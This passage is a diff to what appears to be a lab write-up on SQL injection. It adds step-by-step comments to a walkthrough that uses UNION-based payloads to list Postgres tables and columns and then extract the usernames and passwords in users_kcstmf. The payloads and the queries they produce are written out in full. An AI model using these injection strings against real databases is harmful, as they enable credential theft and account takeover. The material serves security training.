@@ -32,6 +32,11 @@ The database in use here is Postgres (enumerated by injection `' UNION SELECT nu
 
 I use an invalid category so that no articles are found and only my output appears.
 
+
+// This reveals all database tables and their schemas (just the names). Further details need to be extracted with the next injection. Note down potential table schemas that might contain user details.
+
+
+
 ```sql
 SELECT * FROM someTable WHERE category='X' UNION SELECT table_name, null from information_schema.tables--'`
 ```
@@ -41,6 +46,13 @@ SELECT * FROM someTable WHERE category='X' UNION SELECT table_name, null from in
 ### Enumerate colums in this table
 
 The [information_schema.columns](https://www.postgresql.org/docs/9.1/infoschema-columns.html) view holds information about the columns of each table, specifically the `column_name` column. The proper string to inject is `' UNION SELECT column_name, null from information_schema.columns WHERE table_name = 'users_kcstmf'--` to form this query
+
+
+
+// Replace the table name with the one you noted above. Also, make note of the field names that contain usernames and passwords.
+
+
+
 
 ```sql
 SELECT * FROM someTable WHERE category='X' UNION SELECT column_name, null from information_schema.columns WHERE table_name = 'users_kcstmf'--'
@@ -52,11 +64,16 @@ SELECT * FROM someTable WHERE category='X' UNION SELECT column_name, null from i
 
 Now we have all information to obtain the required usernames and passwords. Inject `' UNION SELECT username_spivdg, password_dfxmeh from users_kcstmf--` to form this query:
 
+// Replace the username and password field names according to the ones you noted above.
+
+
 ```sql
 SELECT * FROM someTable WHERE category='X' UNION SELECT username_spivdg, password_dfxmeh from users_kcstmf--'`
 ```
 
 ![usernames and passwords](img/username_and_passwords.png)
+
+// Passwords of users should be now visible.
 
 Now I simply log in to solve this exercise.
 
